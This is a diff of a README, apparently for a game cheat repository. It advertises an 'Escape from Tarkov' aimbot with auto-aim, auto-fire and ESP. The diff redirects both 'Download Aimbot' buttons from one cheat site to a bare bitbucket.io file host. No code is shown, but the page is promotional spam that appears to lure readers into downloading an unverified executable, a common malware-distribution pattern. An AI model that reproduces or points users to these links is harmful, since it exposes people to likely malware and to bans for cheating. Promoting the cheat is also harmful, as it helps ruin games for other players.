@@ -2,7 +2,7 @@
 
 **Can’t win a gunfight? Tired of losing to rats and campers with meta guns? A Tarkov aimbot flips that struggle into total dominance. With headshot lock, auto-fire, and ESP syncing, every click = kill.**
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 🎯 What is a Tarkov Aimbot?
@@ -11,7 +11,7 @@ A **Tarkov aimbot** is a cheat that automatically locks your crosshair onto enem
 
 It’s perfect for Factory PvP, Labs rushes, or clearing Rogues and Raiders with surgical precision.
 
-[![Download Aimbot](https://www.blast.hk/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FY2LpYRv.jpg&hash=a72a0306ddc325929a06a430901c0bda)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Aimbot](https://www.blast.hk/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FY2LpYRv.jpg&hash=a72a0306ddc325929a06a430901c0bda)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 🔥 Aimbot Features for Escape from Tarkov
@@ -81,3 +81,4 @@ tarkov aimbot, escape from tarkov aimbot pc, headshot aimbot eft, tarkov silent 
 ---
 
 If you’re tired of dying to third parties or rat tactics, **aimbot makes you the final boss** of every raid. Clean, fast, precise — Tarkov becomes your personal hunting ground. 🎯🔫💼
+
